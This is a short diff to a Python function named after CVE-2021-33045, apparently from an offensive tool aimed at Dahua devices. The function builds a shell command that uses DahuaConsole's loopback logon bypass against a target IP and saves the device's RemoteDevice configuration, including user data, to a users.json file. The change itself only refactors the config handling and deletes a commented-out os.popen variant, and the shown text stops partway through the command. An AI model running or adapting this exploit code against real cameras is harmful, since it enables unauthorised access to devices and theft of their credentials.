@@ -14,17 +14,10 @@ def cve_2021_33045(ip: str) -> list:
     if ':' in ip: ip, port = ip.split(':')
     else: port = 80
     CWD = os.path.dirname(os.path.abspath(__file__))
-    OUT = config['OUT']
     console = os.path.join(CWD, 'lib/DahuaConsole/Console.py')
-    json_file = os.path.join(OUT, f"{ip}-{port}-users.json")
+    json_file = os.path.join(config.OUT, f"{ip}-{port}-users.json")
 
     try:
-        # with os.popen(f"""
-        # (
-        #     echo "config RemoteDevice save {json_file}"
-        #     echo "quit all"
-        # ) | python -Bu {console} --logon loopback --rhost {ip} --rport {port} --proto dhip 2>/dev/null
-        # """) as f: items = f.readlines()
         cmd = f"""
         (
             echo "config RemoteDevice save {json_file}"
